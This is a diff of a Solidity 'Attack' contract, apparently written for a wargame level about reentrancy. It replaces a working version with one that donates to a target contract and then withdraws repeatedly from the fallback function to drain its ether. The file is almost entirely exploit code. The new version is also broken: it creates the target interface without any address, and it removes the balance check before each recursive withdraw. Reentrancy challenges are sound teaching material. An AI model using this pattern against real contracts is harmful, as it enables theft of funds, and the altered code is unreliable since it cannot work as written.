@@ -1,27 +1,25 @@
 // SPDX-License-Identifier: MIT
 pragma solidity^0.8.13;
 
+interface Instance {
+    
+    function donate(address) external payable;
+    function withdraw(uint) external;
+}
+
 contract Attack {
-
-    Reentrance reentrance;
-
-    constructor(address _level) {
-        reentrance =  Reentrance(payable(_level));
-    }
-
-    function withdraw() public payable {
-        payable(msg.sender).transfer(address(this).balance);
-    }
+    
+    Instance instance = Instance();
 
     function attack() public payable {
-        reentrance.donate{value: msg.value}(address(this));
-        reentrance.withdraw(0.001 ether);
+
+    instance.donate{value: msg.value}(address(this));
+    instance.withdraw(1000000000000000);
     }
 
     fallback() external payable {
-        if(address(reentrance).balance >= 0.001 ether)
-            reentrance.withdraw(0.001 ether);
-
+        
+    instance.withdraw(1000000000000000);
     }
 
 }
